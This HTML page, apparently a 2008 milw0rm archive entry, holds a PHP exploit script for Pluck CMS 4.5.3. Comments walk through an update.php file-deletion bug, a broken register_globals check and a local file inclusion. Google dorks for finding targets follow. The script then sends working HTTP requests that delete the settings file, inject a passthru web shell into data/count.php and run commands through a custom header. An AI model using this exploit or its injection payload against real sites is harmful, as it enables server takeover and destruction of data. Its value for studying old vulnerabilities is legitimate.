<html><head><title>Pluck 4.5.3 (update.php) Remote File Corruption Exploit</title></head><pre>&lt;?php
        /*

         Pluck 4.5.3 update.php remote file corruption exploit
         by Nine:Situations:Group::bookoo
         our site: http://retrogod.altervista.org/
   
         Google dorks: &quot;powered by pluck&quot; +admin 
                       inurl:file=kop1.php
                       inurl:file=kop2.php
                       ...
                  
         Exploit condition : register_globals = on
         Note(!): regardless of php.ini settings, this code will turn your host in a blank page ...


         Vulnerability:
         this program carries a dangerous update.php script. If reachable
         in the main folder, you can delete the files with language and theme preferences:

         ...
         $step = $_GET['step'];
         ...

         ...
         elseif($step == &quot;3&quot;) {

         echo &quot;Rearranging files for compatibility with pluck 4.5...&lt;br&gt;&quot;;

         copy(&quot;data/title.dat&quot;, &quot;data/settings/title.dat&quot;);

         unlink(&quot;data/settings/install.dat&quot;);
         copy(&quot;data/install.dat&quot;, &quot;data/settings/install.dat&quot;);

         copy(&quot;data/options.php&quot;, &quot;data/settings/options.php&quot;);

         copy(&quot;data/pass.php&quot;, &quot;data/settings/pass.php&quot;);

         unlink(&quot;data/settings/langpref.php&quot;);
         copy(&quot;data/inc/lang/langpref.php&quot;, &quot;data/settings/langpref.php&quot;);

         unlink(&quot;data/settings/themepref.php&quot;);
         copy(&quot;data/inc/themes/themepref.php&quot;, &quot;data/settings/themepref.php&quot;);
         ...

         see the unlink() calls... the subsequent copy() has no results if you
         don't place the source files there...

         Now look at index.php, lines 21-26:
         
         ...
         //Include security-enhancements
         include (&quot;data/inc/security.php&quot;);
         //Include Translation data
         include (&quot;data/settings/langpref.php&quot;);
         include (&quot;data/inc/lang/en.php&quot;);
         include (&quot;data/inc/lang/$langpref&quot;);
         ...

         The script now fails to include the langpref.php script and &quot;langpref&quot; variable is not initialized then,
         ***if register_globals=on*** you can include arbitraty files from local resources.
        
         This check in security.php doesn't work as expected :
         ... 
         //Register Globals
         //If Register Globals are ON, unset injected variables
         if(isset($_REQUEST)) {
	   foreach ($_REQUEST as $key =&gt; $value) { 
		if(isset($GLOBALS[$key])) {
			unset($GLOBALS[$key]); 
		    }
	      }
         }
         ...
         ex: http://host/path/index.php?GLOBALS[langpref]=1

         It unsets the &quot;GLOBALS&quot; key from the GLOBALS[] array, while langpref variable remains
         overwritten...

         You can include the /data/inc/page_editmeta.php script which contains a nice php injection:

         ...
         if(isset($_POST['Submit'])) {
         $data = &quot;data/content/$editmeta&quot;;
         include(&quot;data/inc/page_stripslashes.php&quot;);
         $file = fopen($data, &quot;w&quot;);  
         fputs($file, &quot;&lt;?php 
         \$title = \&quot;$title\&quot;;
         \$content = \&quot;$content\&quot;;
         \$contactinc = \&quot;$contactinc\&quot;;
         \$hidden = \&quot;$hidden\&quot;;
         \$description = \&quot;$cont1\&quot;;
         \$keywords = \&quot;$sleutel\&quot;;
         \$copyright = \&quot;$copyr\&quot;;&quot;);
         //Check if we also need to include albums
         if ($incalbum) {
         foreach ($incalbum as $name =&gt; $value) {
         fputs($file, &quot;\n\$incalbum['$name'] = \&quot;yes\&quot;;&quot;);
         } }
         //Check if we also need to include blogs
         if ($incblog) {
         foreach ($incblog as $name =&gt; $value) {
         fputs($file, &quot;\n\$incblog['$name'] = \&quot;yes\&quot;;&quot;);
         } }
         fputs($file, &quot;\n ?&gt;&quot;);
         fclose($file); 
         ...

         also this check in /data/inc/page_editmeta.php is unuseful because
         you call it from the main script:
         
         ...
         //Make sure the file isn't accessed directly
         if((!ereg(&quot;index.php&quot;, $_SERVER['SCRIPT_FILENAME'])) &amp;&amp; (!ereg(&quot;admin.php&quot;, $_SERVER['SCRIPT_FILENAME'])) &amp;&amp; (!ereg(&quot;install.php&quot;, $_SERVER['SCRIPT_FILENAME'])) &amp;&amp; (!ereg(&quot;login.php&quot;, $_SERVER['SCRIPT_FILENAME']))){
         //Give out an &quot;access denied&quot; error
         echo &quot;access denied&quot;;
         //Block all other code
         exit();
         }
         ...

         We choose the /data/count.php to inject a php shell then you can launch commands on the target server.
                
         
        */

        $cmd = &quot;uname&quot;;//change here
        
        error_reporting(7);
        $host=$argv[1];
        $path=$argv[2];
        $argv[3] ? $port = (int) $argv[3] : $port = 80;
        $argv[2] ? print(&quot;attackin'...\n&quot;) : die (&quot;syntax: php &quot;.$argv[0].&quot; [host] [path] [[port]]&quot;);

        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true : false;
        $win ? dl(&quot;php_curl.dll&quot;) : dl(&quot;php_curl.so&quot;);

        $url = &quot;http://$host:$port&quot;;
     
        function send($url,$header)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL,$url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 0);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $header);

            $data = curl_exec($ch); if (curl_errno($ch)) {
            print curl_error($ch).&quot;\n&quot;;
            } else {
               curl_close($ch);
            }
            sleep(1);
            return $data.&quot;\n&quot;;
            
        }

        $agent = &quot;Mozilla&lt;/b&gt;/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;;

        $header =&quot;GET &quot;.$path.&quot;update.php?step=3 HTTP/1.0\r\n&quot;;
        $header.=&quot;Host: $host\r\nUser-Agent: $agent\r\nConnection: Close\r\n\r\n&quot;;
        send($url,$header);

        //oh, how evil... tested and working against PHP 5.2.4
        $header =&quot;POST &quot;.$path.&quot;index.php HTTP/1.0\r\n&quot;;
        $header.=&quot;Host: $host\r\nUser-Agent: $agent\r\n&quot;;
        $header.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
        $header.=&quot;Content-Length: 218\r\n&quot;;
        $header.=&quot;Connection: Close\r\n\r\n&quot;;
        $header.=&quot;Submit=1&amp;GLOBALS[langpref]=../page_editmeta.php&amp;GLOBALS[editmeta]=../count.php&amp;GLOBALS[sleutel]=\$x{\$y{error_reporting(0)}}\$x{\$y{set_time_limit(0)}}\$x{\$y{print(my_flag)}}\$x{\$y{passthru(\$_SERVER[HTTP_CMD])}}\$x{\$y{die()}}&quot;;
        send($url,$header);

        $header =&quot;GET &quot;.$path.&quot;data/count.php HTTP/1.0\r\n&quot;;
        $header.=&quot;Host: $host\r\nUser-Agent: $agent\r\n&quot;;
        $header.=&quot;CMD: $cmd\r\n&quot;;
        $header.=&quot;Connection: Close\r\n\r\n&quot;;
        $out=send($url,$header);
        $out=explode(&quot;my_flag&quot;,$out);
        count($out)==2 ? print(&quot;exploit succeeded...\n$out[1]&quot;) : print(&quot;exploit failed... :(\n&quot;);
?&gt;

# milw0rm.com [2008-09-19]</pre></html>